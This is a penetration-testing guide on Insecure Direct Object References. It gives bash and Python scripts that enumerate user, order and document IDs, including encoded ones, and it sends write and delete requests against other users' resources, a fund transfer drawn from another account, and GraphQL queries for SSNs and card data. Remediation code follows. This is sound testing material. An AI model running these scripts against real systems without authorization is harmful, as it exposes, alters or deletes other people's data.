# WSTG-AUTHZ-04: Testing for Insecure Direct Object References (IDOR)

## Test ID
WSTG-AUTHZ-04

## Test Name
Testing for Insecure Direct Object References (IDOR)

## High-Level Description

Insecure Direct Object References (IDOR) occur when an application uses user-supplied input to access objects directly without proper authorization checks. Attackers can modify parameters like IDs, filenames, or keys to access unauthorized resources belonging to other users. IDOR is a form of broken access control and can lead to unauthorized data disclosure, modification, or deletion.

---

## What to Check

### Common IDOR Parameters

- [ ] User IDs (user_id, uid, userId)
- [ ] Document/File IDs (doc_id, file_id)
- [ ] Order IDs (order_id, orderId)
- [ ] Account numbers
- [ ] Transaction IDs
- [ ] Message/Email IDs
- [ ] UUIDs/GUIDs (if predictable)
- [ ] Encoded values (Base64, hex)
- [ ] Hashed values (if weak)

### IDOR Locations

| Location | Example |
|----------|---------|
| URL path | `/api/users/123/profile` |
| Query string | `/download?file_id=456` |
| Request body | `{"user_id": 789}` |
| Headers | `X-User-ID: 123` |
| Cookies | `user_id=123` |

---

## How to Test

### Step 1: Identify Object References

```bash
# Look for numeric IDs in requests
# Monitor API calls for patterns like:
# /api/users/123
# /api/orders/456
# /api/documents/789

# Common endpoints to check
endpoints=(
    "/api/users/{id}"
    "/api/users/{id}/profile"
    "/api/users/{id}/orders"
    "/api/users/{id}/documents"
    "/api/accounts/{id}"
    "/api/transactions/{id}"
    "/api/messages/{id}"
    "/api/invoices/{id}"
    "/api/files/{id}"
)

# Replace {id} with actual and target IDs to test
```

### Step 2: Test Sequential ID Manipulation

```bash
#!/bin/bash
# Test accessing other users' resources by ID manipulation

TOKEN="your_auth_token"
OWN_ID=100
BASE_URL="https://target.com"

# Test accessing nearby IDs
for id in $(seq 95 105); do
    if [ "$id" != "$OWN_ID" ]; then
        response=$(curl -s -w "\n%{http_code}" \
            -H "Authorization: Bearer $TOKEN" \
            "$BASE_URL/api/users/$id/profile")

        status=$(echo "$response" | tail -1)
        body=$(echo "$response" | sed '$d')

        if [ "$status" == "200" ]; then
            echo "[VULN] IDOR: Accessed user $id"
            echo "Data: $(echo $body | head -c 200)"
        fi
    fi
done
```

### Step 3: Test IDOR in Different HTTP Methods

```bash
#!/bin/bash
# Test IDOR across HTTP methods

TOKEN="your_auth_token"
TARGET_ID=101  # Other user's ID
BASE_URL="https://target.com"

# GET - Read data
echo "=== Testing GET ==="
curl -s -X GET "$BASE_URL/api/users/$TARGET_ID/profile" \
    -H "Authorization: Bearer $TOKEN"

# PUT - Modify data
echo "=== Testing PUT ==="
curl -s -X PUT "$BASE_URL/api/users/$TARGET_ID/profile" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"name": "Hacked"}'

# DELETE - Delete resource
echo "=== Testing DELETE ==="
curl -s -X DELETE "$BASE_URL/api/users/$TARGET_ID/profile" \
    -H "Authorization: Bearer $TOKEN"

# POST - Create with someone else's ID
echo "=== Testing POST ==="
curl -s -X POST "$BASE_URL/api/users/$TARGET_ID/orders" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"product": "item1"}'
```

### Step 4: Test UUID/GUID Enumeration

```bash
#!/bin/bash
# UUIDs are not immune to IDOR if they can be discovered

# Check if UUIDs are exposed in:
# - API responses listing resources
# - URL referer headers
# - JavaScript source code
# - Error messages
# - Public profiles

# Test with discovered UUIDs
curl -s "https://target.com/api/documents/550e8400-e29b-41d4-a716-446655440000" \
    -H "Authorization: Bearer $TOKEN"

# Check if UUID format validation is enforced
# Invalid UUIDs might reveal information
curl -s "https://target.com/api/documents/invalid-uuid" \
    -H "Authorization: Bearer $TOKEN"
```

### Step 5: Test Encoded/Hashed References

```bash
#!/bin/bash
# Test Base64 encoded IDs

# Decode current reference
current_ref="MTIz"  # Base64 of "123"
decoded=$(echo "$current_ref" | base64 -d)
echo "Decoded: $decoded"

# Encode other IDs
for id in {120..130}; do
    encoded=$(echo -n "$id" | base64)
    response=$(curl -s -o /dev/null -w "%{http_code}" \
        "https://target.com/api/data/$encoded" \
        -H "Authorization: Bearer $TOKEN")

    if [ "$response" == "200" ]; then
        echo "[VULN] IDOR with encoded ID $id ($encoded)"
    fi
done

# Test hex encoded IDs
for id in {120..130}; do
    hex=$(printf '%x' $id)
    response=$(curl -s -o /dev/null -w "%{http_code}" \
        "https://target.com/api/data/$hex" \
        -H "Authorization: Bearer $TOKEN")

    if [ "$response" == "200" ]; then
        echo "[VULN] IDOR with hex ID $hex"
    fi
done
```

### Step 6: Test IDOR in Request Body

```bash
# IDOR in JSON body
curl -s -X POST "https://target.com/api/transfer" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{
        "from_account": "OTHER_USER_ACCOUNT",
        "to_account": "MY_ACCOUNT",
        "amount": 100
    }'

# IDOR with user_id in body
curl -s -X GET "https://target.com/api/user/orders" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"user_id": 101}'

# IDOR in form data
curl -s -X POST "https://target.com/api/export" \
    -H "Authorization: Bearer $TOKEN" \
    -d "user_id=101&format=csv"
```

### Step 7: Comprehensive IDOR Tester

```python
#!/usr/bin/env python3
import requests
import base64
import json
from concurrent.futures import ThreadPoolExecutor

class IDORTester:
    def __init__(self, base_url, auth_token, own_id):
        self.base_url = base_url
        self.own_id = own_id
        self.session = requests.Session()
        self.session.headers.update({
            "Authorization": f"Bearer {auth_token}",
            "Content-Type": "application/json"
        })
        self.vulnerabilities = []

    def test_numeric_idor(self, endpoint_template, id_range=range(1, 100)):
        """Test numeric ID manipulation"""
        print(f"\n[*] Testing numeric IDOR on: {endpoint_template}")

        for test_id in id_range:
            if test_id == self.own_id:
                continue

            endpoint = endpoint_template.replace("{id}", str(test_id))

            try:
                response = self.session.get(f"{self.base_url}{endpoint}")

                if response.status_code == 200:
                    # Check if we got actual data
                    try:
                        data = response.json()
                        if data and len(str(data)) > 10:
                            print(f"[VULN] IDOR at ID {test_id}: {endpoint}")
                            self.vulnerabilities.append({
                                "type": "numeric",
                                "endpoint": endpoint,
                                "id": test_id,
                                "method": "GET"
                            })
                    except:
                        pass

            except Exception as e:
                pass

        return self.vulnerabilities

    def test_write_idor(self, endpoint_template, test_ids):
        """Test IDOR for write operations"""
        print(f"\n[*] Testing write IDOR on: {endpoint_template}")

        methods = ["PUT", "PATCH", "DELETE"]

        for test_id in test_ids:
            if test_id == self.own_id:
                continue

            endpoint = endpoint_template.replace("{id}", str(test_id))

            for method in methods:
                try:
                    if method == "DELETE":
                        # Don't actually delete - just test response
                        response = self.session.request(
                            method,
                            f"{self.base_url}{endpoint}",
                            timeout=5
                        )
                    else:
                        response = self.session.request(
                            method,
                            f"{self.base_url}{endpoint}",
                            json={"test": "data"},
                            timeout=5
                        )

                    if response.status_code in [200, 204]:
                        print(f"[VULN] Write IDOR: {method} {endpoint}")
                        self.vulnerabilities.append({
                            "type": "write",
                            "endpoint": endpoint,
                            "id": test_id,
                            "method": method
                        })

                except:
                    pass

        return self.vulnerabilities

    def test_body_idor(self, endpoint, param_name, test_ids):
        """Test IDOR in request body"""
        print(f"\n[*] Testing body IDOR on: {endpoint} ({param_name})")

        for test_id in test_ids:
            if test_id == self.own_id:
                continue

            try:
                response = self.session.post(
                    f"{self.base_url}{endpoint}",
                    json={param_name: test_id}
                )

                if response.status_code == 200:
                    print(f"[VULN] Body IDOR with {param_name}={test_id}")
                    self.vulnerabilities.append({
                        "type": "body",
                        "endpoint": endpoint,
                        "parameter": param_name,
                        "id": test_id
                    })

            except:
                pass

        return self.vulnerabilities

    def test_encoded_idor(self, endpoint_template, test_ids, encoding='base64'):
        """Test IDOR with encoded IDs"""
        print(f"\n[*] Testing {encoding} encoded IDOR on: {endpoint_template}")

        for test_id in test_ids:
            if test_id == self.own_id:
                continue

            if encoding == 'base64':
                encoded = base64.b64encode(str(test_id).encode()).decode()
            elif encoding == 'hex':
                encoded = hex(test_id)[2:]
            else:
                encoded = str(test_id)

            endpoint = endpoint_template.replace("{id}", encoded)

            try:
                response = self.session.get(f"{self.base_url}{endpoint}")

                if response.status_code == 200:
                    print(f"[VULN] Encoded IDOR: {test_id} -> {encoded}")
                    self.vulnerabilities.append({
                        "type": f"encoded_{encoding}",
                        "endpoint": endpoint,
                        "original_id": test_id,
                        "encoded_id": encoded
                    })

            except:
                pass

        return self.vulnerabilities

    def test_parameter_pollution(self, endpoint, param_name):
        """Test HTTP Parameter Pollution for IDOR"""
        print(f"\n[*] Testing HPP IDOR on: {endpoint}")

        # Test sending multiple IDs
        payloads = [
            f"{param_name}={self.own_id}&{param_name}=101",
            f"{param_name}=101&{param_name}={self.own_id}",
            f"{param_name}[]={self.own_id}&{param_name}[]=101",
        ]

        for payload in payloads:
            try:
                response = self.session.get(
                    f"{self.base_url}{endpoint}?{payload}"
                )

                if response.status_code == 200:
                    # Check if other user's data returned
                    if "101" in response.text or str(101) in response.text:
                        print(f"[VULN] HPP IDOR: {payload}")
                        self.vulnerabilities.append({
                            "type": "hpp",
                            "endpoint": endpoint,
                            "payload": payload
                        })

            except:
                pass

        return self.vulnerabilities

    def generate_report(self):
        """Generate IDOR testing report"""
        print("\n" + "="*60)
        print("IDOR TESTING REPORT")
        print("="*60)

        if not self.vulnerabilities:
            print("\nNo IDOR vulnerabilities found.")
            return

        print(f"\nTotal vulnerabilities: {len(self.vulnerabilities)}\n")

        # Group by type
        by_type = {}
        for vuln in self.vulnerabilities:
            vuln_type = vuln['type']
            if vuln_type not in by_type:
                by_type[vuln_type] = []
            by_type[vuln_type].append(vuln)

        for vuln_type, vulns in by_type.items():
            print(f"\n{vuln_type.upper()} ({len(vulns)} findings):")
            for v in vulns:
                print(f"  - {v.get('endpoint', v)}")

# Usage
tester = IDORTester(
    base_url="https://target.com",
    auth_token="your_token_here",
    own_id=100
)

# Test various endpoints
endpoints = [
    "/api/users/{id}/profile",
    "/api/users/{id}/orders",
    "/api/accounts/{id}",
    "/api/documents/{id}",
]

for endpoint in endpoints:
    tester.test_numeric_idor(endpoint, range(95, 110))
    tester.test_write_idor(endpoint, [101, 102, 103])

# Test body IDOR
tester.test_body_idor("/api/user/data", "user_id", [101, 102, 103])

# Generate report
tester.generate_report()
```

### Step 8: Test GraphQL IDOR

```bash
# GraphQL IDOR testing
curl -s -X POST "https://target.com/graphql" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{
        "query": "query { user(id: 101) { id name email ssn creditCard } }"
    }'

# Test with variables
curl -s -X POST "https://target.com/graphql" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{
        "query": "query GetUser($id: ID!) { user(id: $id) { id name email } }",
        "variables": {"id": "101"}
    }'

# Enumerate using introspection
curl -s -X POST "https://target.com/graphql" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"query": "{ __schema { types { name fields { name } } } }"}'
```

---

## Tools

### IDOR Testing

| Tool | Description | Usage |
|------|-------------|-------|
| **Burp Intruder** | ID enumeration | Numeric/payload fuzzing |
| **Autorize (Burp)** | Authorization testing | Compare responses |
| **OWASP ZAP** | Active scanning | Automated testing |
| **Postman** | API testing | Collection runner |

### ID Discovery

| Tool | Description |
|------|-------------|
| **Burp Logger++** | Request logging |
| **ParamMiner** | Parameter discovery |
| **JavaScript analysis** | Extract IDs from code |

---

## Remediation Guide

### 1. Implement Authorization Checks

```python
from functools import wraps
from flask import request, g, abort

def authorize_resource_access(resource_type):
    """Decorator to verify resource ownership"""
    def decorator(f):
        @wraps(f)
        def decorated_function(*args, **kwargs):
            resource_id = kwargs.get('id')

            # Get resource from database
            resource = get_resource(resource_type, resource_id)

            if not resource:
                abort(404)

            # Check ownership or admin status
            if resource.owner_id != g.current_user.id:
                if not g.current_user.has_role('admin'):
                    abort(403)

            return f(*args, **kwargs)
        return decorated_function
    return decorator

# Usage
@app.route('/api/documents/<int:id>')
@require_auth
@authorize_resource_access('document')
def get_document(id):
    return Document.query.get(id).to_json()
```

### 2. Use Indirect References

```python
import secrets
import hashlib

class IndirectReferenceMap:
    """Map direct IDs to indirect references"""

    def __init__(self, user_id):
        self.user_id = user_id
        self.cache = {}

    def create_reference(self, direct_id, resource_type):
        """Create an indirect reference for a resource"""
        # Generate unique indirect reference
        seed = f"{self.user_id}:{resource_type}:{direct_id}:{secrets.token_hex(8)}"
        indirect_ref = hashlib.sha256(seed.encode()).hexdigest()[:16]

        # Store mapping in database (per user session)
        IndirectMapping.create(
            user_id=self.user_id,
            indirect_ref=indirect_ref,
            direct_id=direct_id,
            resource_type=resource_type
        )

        return indirect_ref

    def resolve_reference(self, indirect_ref, resource_type):
        """Resolve indirect reference to direct ID"""
        mapping = IndirectMapping.query.filter_by(
            user_id=self.user_id,
            indirect_ref=indirect_ref,
            resource_type=resource_type
        ).first()

        if not mapping:
            return None

        return mapping.direct_id

# Usage
@app.route('/api/documents/<ref>')
@require_auth
def get_document(ref):
    ref_map = IndirectReferenceMap(current_user.id)
    document_id = ref_map.resolve_reference(ref, 'document')

    if not document_id:
        abort(404)

    return Document.query.get(document_id).to_json()
```

### 3. Query-Based Authorization

```python
from sqlalchemy import and_

class SecureResourceQuery:
    """Always include ownership in queries"""

    @staticmethod
    def get_user_document(document_id, user_id):
        """Get document only if user owns it"""
        return Document.query.filter(
            and_(
                Document.id == document_id,
                Document.owner_id == user_id
            )
        ).first()

    @staticmethod
    def get_user_orders(user_id):
        """Get orders for specific user only"""
        return Order.query.filter_by(user_id=user_id).all()

# Usage in routes
@app.route('/api/documents/<int:id>')
@require_auth
def get_document(id):
    document = SecureResourceQuery.get_user_document(id, current_user.id)

    if not document:
        abort(404)  # Don't reveal existence

    return document.to_json()
```

### 4. Use UUIDs Instead of Sequential IDs

```python
import uuid
from sqlalchemy.dialects.postgresql import UUID

class Document(db.Model):
    # Use UUID as primary key instead of sequential integer
    id = db.Column(UUID(as_uuid=True), primary_key=True, default=uuid.uuid4)
    owner_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    content = db.Column(db.Text)

    # Still implement authorization checks - UUIDs are NOT a security control
```

---

## Risk Assessment

### CVSS Score

| Finding | CVSS | Severity |
|---------|------|----------|
| Read other users' sensitive data (PII, financial) | 7.5 | High |
| Modify other users' data | 8.1 | High |
| Delete other users' resources | 8.1 | High |
| Access administrative resources | 8.8 | High |
| Read non-sensitive data | 4.3 | Medium |

---

## CWE Categories

| CWE ID | Title | Description |
|--------|-------|-------------|
| **CWE-639** | Authorization Bypass Through User-Controlled Key | Core IDOR issue |
| **CWE-284** | Improper Access Control | Broken access control |
| **CWE-862** | Missing Authorization | No authorization check |
| **CWE-863** | Incorrect Authorization | Wrong authorization |

---

## References

- [OWASP WSTG - IDOR Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References)
- [OWASP IDOR Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html)
- [PortSwigger IDOR](https://portswigger.net/web-security/access-control/idor)

---

## Checklist

```
[ ] Object references identified in requests
[ ] Sequential ID enumeration tested
[ ] IDOR in GET requests tested
[ ] IDOR in POST/PUT/DELETE tested
[ ] Body parameter IDOR tested
[ ] Encoded ID manipulation tested
[ ] UUID/GUID enumeration attempted
[ ] GraphQL IDOR tested (if applicable)
[ ] HPP for IDOR tested
[ ] Different user contexts tested
[ ] Findings documented
[ ] Remediation recommendations provided
```
